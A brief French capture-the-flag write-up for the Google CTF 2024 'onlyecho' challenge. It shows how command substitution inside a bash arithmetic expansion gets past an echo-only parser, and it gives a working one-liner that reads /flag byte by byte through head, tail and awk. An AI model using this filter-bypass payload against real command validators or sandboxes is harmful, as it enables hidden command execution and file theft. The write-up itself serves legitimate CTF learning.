# ONLYECHO

```nc onlyecho.2024.ctfcompetition.com 1337```

code : [https://github.com/google/google-ctf/blob/main/2024/quals/misc-onlyecho/challenge/challenge.js](https://)

Le script utilise bash-parser pour vérifier que les seules commandes sont des "echo". Une fois la vérification effectué, on execute le script bash.

On peut afficher les variables d'environements:
```echo $SHELL```

On peut lister les répertoires:
```echo /*```

Le programme effectue un parsing de l'entrée, creé un arbre d'interpréteur bash, la seule commande autorisée est echo, les redirections sont interdites, on peut utiliser les pipes

Le parseur ne détecte pas les commandes à l'intérieur des opérations arithmétiques, la seule chose qu'on peut output c'est des nombres, on extrait les caractères 1 à 1 et on utilise awk pour récupérer le code ascii

```echo $((`head -c 42 /flag | tail -c 1 | awk 'BEGIN{for(n=0;n<256;n++)ord[sprintf("%c",n)]=n}{print ord[$1]}'`))```

Il suffit de changer 42 par la position du caractère à lire
